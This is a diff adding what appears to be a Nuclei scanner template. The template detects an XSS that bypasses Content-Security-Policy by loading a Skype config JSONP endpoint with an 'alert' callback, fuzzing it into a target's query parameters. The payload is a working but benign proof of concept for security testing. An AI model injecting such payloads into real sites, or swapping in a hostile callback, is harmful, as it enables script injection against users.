@@ -1,0 +1,55 @@
+id: skype-config-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Skype Config
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,skype-config,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "skype.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: skype_config_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://a.config.skype.com/config/v1/SkypeLyncWebExperience/905_1.2.5.0?apikey=shareButton&fingerprint=0487c2fb-967c-4d8d-9635-75249326f72e&callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "skype_config_csp_xss == true"
+# digest: 4a0a00473045022100dc59de64ea7e73d710968e497d4a74927e05d3b6abd2e0c4f54d751847b65753022038cd76609b34f51e8b7b176e5e2a03a54d8ade400ceeffd6f7e7c33a8a3d744c:922c64590222798bb761d5b6d8e72950
